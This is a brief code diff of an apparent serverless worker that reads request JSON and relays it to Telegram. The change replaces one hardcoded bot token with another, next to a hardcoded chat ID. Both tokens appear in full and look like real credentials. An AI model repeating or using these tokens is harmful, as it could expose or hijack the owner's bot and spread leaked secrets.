@@ -8,7 +8,7 @@ export default {
         const data = await request.json();
         
         // Tumhari Telegram Details
-        const BOT_TOKEN = "9169423487:AAHlpAHDBH75nO_MQi_nfFN6IA3MwDRqLpM"; 
+        const BOT_TOKEN = "9169423487:AAF-Cd0Y1i-V9XNCMLw64oX5DWjIHSj51w8"; 
         const CHAT_ID = "7795154567";
 
         const message = `
